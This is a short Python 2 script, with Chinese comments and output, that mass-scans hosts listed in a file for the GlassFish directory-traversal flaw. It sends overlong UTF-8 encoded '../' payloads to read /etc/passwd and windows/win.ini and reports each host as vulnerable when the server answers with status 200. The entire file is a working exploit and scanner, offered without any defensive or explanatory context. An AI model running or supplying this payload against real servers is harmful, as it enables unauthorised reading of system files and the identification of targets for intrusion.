#-*- coding: utf-8 -*-
import requests
import time

for ip in open('ip_data.txt'):
    ip=ip.replace('\n','')
    paload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    paload_windows = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    # data_linux=requests.get(url+paload_linux)  #获取请求后的返回值
    # data_windwos=requests.get(url+paload_windows)
    try:
        data_linux = requests.get(ip + paload_linux).status_code  # 获取请求后返回的状态码
        data_windwos = requests.get(ip + paload_windows).status_code
        if data_windwos == 200 or data_linux == 200:
            print ip,("->"),("存在glassfish漏洞")
        else:
            print ip,("->"),("不存在glassfish漏洞")
        time.sleep(1)
    except Exception as e:
        pass
